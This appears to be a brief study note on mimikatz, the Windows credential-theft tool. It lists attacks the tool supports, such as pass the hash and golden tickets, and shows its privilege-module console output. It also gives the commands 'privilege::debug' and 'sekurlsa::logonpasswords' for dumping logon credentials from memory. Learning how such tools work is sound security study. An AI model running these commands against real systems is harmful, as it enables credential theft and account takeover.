
- overview tool used to view and steal credentials, generate kerberos tickets and leverage attacks
- Dump credentioals stored in memory
- Just afew attacks
	- Credential dumping
	- Pass the hash
	- OverPass the hash
	- Pass the ticket
	- Silver ticket
	- Golden ticket



```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::
ERROR mimikatz_doLocal ; "(null)" command of "privilege" module not found !

Module :        privilege
Full name :     Privilege module

           debug  -  Ask debug privilege
          driver  -  Ask load driver privilege
        security  -  Ask security privilege
             tcb  -  Ask tcb privilege
          backup  -  Ask backup privilege
         restore  -  Ask restore privilege
          sysenv  -  Ask system environment privilege
              id  -  Ask a privilege by its id
            name  -  Ask a privilege by its name

mimikatz #
```

to check if privileges are alright

```
mimikatz # privilege::debug
Privilege '20' OK
```

check for logon password

```
sekurlsa::logonpasswords
```




## How does credman work?


https://woshub.com/saved-passwords-windows-credential-manager/